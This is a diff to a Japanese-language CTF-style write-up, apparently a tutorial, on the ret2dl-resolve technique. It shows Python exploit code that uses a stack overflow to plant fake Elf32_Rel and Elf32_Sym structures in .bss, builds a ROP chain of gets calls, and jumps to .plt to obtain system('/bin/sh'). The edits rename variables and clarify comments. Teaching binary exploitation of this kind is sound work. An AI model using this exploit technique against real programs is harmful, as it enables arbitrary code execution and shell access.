@@ -523,7 +523,7 @@ reloc_arg---+   reloc_arg + .rel.plt         |                                  
     #+end_example
     ここで、 ~reloc_arg~ にはスタックバッファオーバフローを利用して任意の値を指定することが可能なため、 ~.rel.plt~ の値から偽の ~Elf32_Rel~ 構造体を配置したアドレスまでのオフセットを設定する。
     #+begin_src python
-      reloc_arg = Elf32_Rel_addr - rel
+      reloc_arg = fake_elf32_rel_addr - rel
     #+end_src
     
     また、偽の ~Elf32_Rel~ 構造体では、 ~r_info~ を 8 bitだけ右シフトした値を ~.dynsym~ を基準とした偽の ~Elf32_Sym~ 構造体へのインデックスとして使用する。
@@ -534,10 +534,10 @@ reloc_arg---+   reloc_arg + .rel.plt         |                                  
     今回は特に関係ないものの、 ~gets~ の GOTエントリを指定しておく。    
     #+begin_src python
       r_offset = gets_got
-      r_info   = ((Elf32_Sym_addr - dynsym)//0x10)<<8 | 7
+      r_info   = ((fake_elf32_sym_addr - dynsym)//0x10)<<8 | 7
     #+end_src
     
-    ~Elf32_Sym~ 構造体の ~st_name~ は、 ~.dynstr~ の値から ~"system"~ のシンボルを配置したアドレスまでのオフセットを設定する。
+    ~Elf32_Sym~ 構造体の ~st_name~ は、 ~.dynstr~ の値から文字列 ~"system\x00"~ のアドレスまでのオフセットを設定する。
     このため、事前にオフセットの値を計算し、 ~Elf32_Sym~ 構造体に格納しておく。
 
     ~st_info~ は、グローバル関数であることを指す ~0x12~ を設定しておく必要があるため、設定しておく。
@@ -580,45 +580,45 @@ reloc_arg---+   reloc_arg + .rel.plt         |                                  
 
     Solverを書くときは、事前に ~.bss~ のどのアドレスがどの構造体やシンボルに対応するか計算しておき、ROPで ~gets~ の引数として指定しておき、ROPチェインが発火後に、それぞれの構造体やシンボルを書き込んでいく。
     #+begin_src python
-      Elf32_Rel_addr = bss
+      fake_elf32_rel_addr = bss
 
-      Elf32_Sym_addr = Elf32_Rel_addr + 0x10
+      fake_elf32_sym_addr = fake_elf32_rel_addr + 0x10
 
-      system_symbol_addr = Elf32_Sym_addr + 0x14
+      system_symbol_addr = fake_elf32_sym_addr + 0x14
 
-      sh_symbol_addr = system_symbol_addr + 0x1c
+      sh_string_addr = system_symbol_addr + 0x1c
     #+end_src
 
 **** ROPチェインの作成
      あとは、用意した偽の構造体やシンボルを ~.bss~ 領域内に格納できるように、複数回 ~gets~ を呼び出す必要がある。
 
      そこで、 それぞれ計算しておいた領域に構造体を引数とし、 ~gets@plt~ にジャンプするROPを組む。
-     x86のROPは、参考のセキュリティコンテストチャレンジブックが参考になる。
+     x86のROPは、参考文献に挙げたセキュリティコンテストチャレンジブックが参考になる。
      
      #+begin_src python
       # padding
       buf = b'A'*0x84                 # fill stack
       buf += p32(0xdeadbeaf)         # saved_ebp
 
-      # gets(Elf32_Rel_addr)
+      # gets(fake_elf32_rel_addr)
       buf += p32(gets_plt)           # main return addr
       buf += p32(pop_ret)            # gets return addr
-      buf += p32(Elf32_Rel_addr)     # gets arg
+      buf += p32(fake_elf32_rel_addr)     # gets arg
 
-      # gets(Elf32_Sym_addr)
+      # gets(fake_elf32_sym_addr)
       buf += p32(gets_plt)           # pop ret return addr
       buf += p32(pop_ret)            # gets return addr
-      buf += p32(Elf32_Sym_addr)     # gets arg
+      buf += p32(fake_elf32_sym_addr)     # gets arg
 
       # gets(system_symbol_addr)
       buf += p32(gets_plt)           # pop ret return addr
       buf += p32(pop_ret)            # gets return addr
       buf += p32(system_symbol_addr) # gets arg
 
-      # gets(sh_symbol_addr)
+      # gets(sh_string_addr)
       buf += p32(gets_plt)           # pop ret return addr
       buf += p32(pop_ret)            # gets return  addr
-      buf += p32(sh_symbol_addr)     # gets arg
+      buf += p32(sh_string_addr)     # gets arg
      #+end_src
 
      それぞれの構造体とシンボルの書き込みを行うROPを組んだ後、偽の構造体を元にアドレスを解決させるため、 ~.plt~ セクションの先頭にジャンプする。
@@ -627,8 +627,8 @@ reloc_arg---+   reloc_arg + .rel.plt         |                                  
       # system('/bin/sh')
       buf += p32(plt)                # pop ret return addr
       buf += p32(reloc_arg)          # reloc arg
-      buf += p32(0xdeadbeef)         # padding
-      buf += p32(sh_symbol_addr)     # system arg
+      buf += p32(0xdeadbeef)         # return address of system()
+      buf += p32(sh_string_addr)     # system arg
      #+end_src
 
 *** Solver    
